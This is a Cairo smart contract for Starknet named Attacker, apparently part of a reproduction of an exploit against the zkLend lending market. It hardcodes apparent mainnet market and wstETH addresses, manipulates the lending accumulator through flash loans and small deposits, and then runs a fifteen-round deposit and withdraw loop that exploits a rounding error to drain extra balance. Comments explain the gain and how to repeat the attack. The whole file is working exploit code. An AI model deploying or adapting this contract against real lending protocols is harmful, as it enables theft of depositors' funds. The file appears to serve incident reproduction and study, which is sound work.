use starknet::ContractAddress;
use zklend_repro::interfaces::{IMarketDispatcher, IMarketDispatcherTrait};

#[starknet::interface]
pub trait IAttacker<TContractState> {
    fn get_lending_accumulator_for_token(self: @TContractState, token: ContractAddress) -> felt252;
    fn update_market_contract(ref self: TContractState, new_market_address: ContractAddress);
    fn call_flash_loan(self: @TContractState, amount: felt252);
    fn zklend_flash_callback(
        ref self: TContractState, initiator: ContractAddress, calldata: Span<felt252>,
    );
    fn deposit(ref self: TContractState);
    fn deposit_and_withdraw(ref self: TContractState);
    fn borrow(self: @TContractState, token: ContractAddress, amount: felt252);
}


#[starknet::contract]
pub mod Attacker {
    use starknet::{ContractAddress, contract_address_const, get_contract_address};
    use starknet::storage::{StoragePointerReadAccess, StoragePointerWriteAccess};
    use super::{IMarketDispatcher, IMarketDispatcherTrait};
    use zklend_repro::interfaces::{IERC20Dispatcher, IERC20DispatcherTrait};

    const market_address_felt: felt252 =
        0x4c0a5193d58f74fbace4b74dcf65481e734ed1714121bdc571da345540efa05;

    const wstETH_address_felt: felt252 =
        0x0057912720381af14b0e5c87aa4718ed5e527eab60b3801ebf702ab09139e38b;

    #[storage]
    struct Storage {
        market_contract: ContractAddress,
    }

    #[constructor]
    fn constructor(ref self: ContractState, market_address: ContractAddress) {
        self.market_contract.write(market_address);
    }

    #[abi(embed_v0)]
    impl AttackerImpl of super::IAttacker<ContractState> {
        fn get_lending_accumulator_for_token(
            self: @ContractState, token: ContractAddress,
        ) -> felt252 {
            let market = IMarketDispatcher { contract_address: self.market_contract.read() };
            market.get_lending_accumulator(token)
        }

        fn update_market_contract(ref self: ContractState, new_market_address: ContractAddress) {
            self.market_contract.write(new_market_address);
        }

        fn call_flash_loan(self: @ContractState, amount: felt252) {
            let market_address: ContractAddress = contract_address_const::<market_address_felt>();
            let market = IMarketDispatcher { contract_address: market_address };

            let calldata = array![amount];

            let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
            market.flash_loan(get_contract_address(), erc20_address, 1, calldata.span());
        }

        fn zklend_flash_callback(
            ref self: ContractState, initiator: ContractAddress, calldata: Span<felt252>,
        ) {
            let market_address: ContractAddress = contract_address_const::<market_address_felt>();
            let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
            let erc20 = IERC20Dispatcher { contract_address: erc20_address };

            let cd_1: felt252 = *calldata.at(0);
            let amount = cd_1.into();

            erc20.transfer(market_address, amount);
        }

        fn deposit(ref self: ContractState) {
            let market_address: ContractAddress = contract_address_const::<market_address_felt>();
            let market = IMarketDispatcher { contract_address: market_address };
            let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
            let erc20 = IERC20Dispatcher { contract_address: erc20_address };

            let accumulator = 1827500000000000001;
            erc20.approve(market_address, 1_000_000_000_000_000_000_000);

            market.deposit(erc20_address, accumulator + 1); // 1 tokens

            // also enable collateral for this token
            market.enable_collateral(erc20_address);
        }

        fn deposit_and_withdraw(ref self: ContractState) {
            let market_address: ContractAddress = contract_address_const::<market_address_felt>();
            let market = IMarketDispatcher { contract_address: market_address };
            let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();

            let accumulator = 1827500000000000001;
            let amount_to_withdraw = 2712865270701095936; // accumulator * 1.5

            for _ in 0..15_u8 {
                market.deposit(erc20_address, accumulator + accumulator + 2);
                // At this point the attacker deposited 1.8*3, and got back 2.7
                // They should have 2.7 left, but their balance is 3.6
                market.withdraw(erc20_address, amount_to_withdraw);
            }
            // eventuall/ withdraw all the extra balance, to be able to repeat the attack
            market.withdraw(erc20_address, 15_000_000_000_000_000_000);
        }

        fn borrow(self: @ContractState, token: ContractAddress, amount: felt252) {
            let market_address: ContractAddress = contract_address_const::<market_address_felt>();
            let market = IMarketDispatcher { contract_address: market_address };

            market.borrow(token, amount);
        }
    }
}
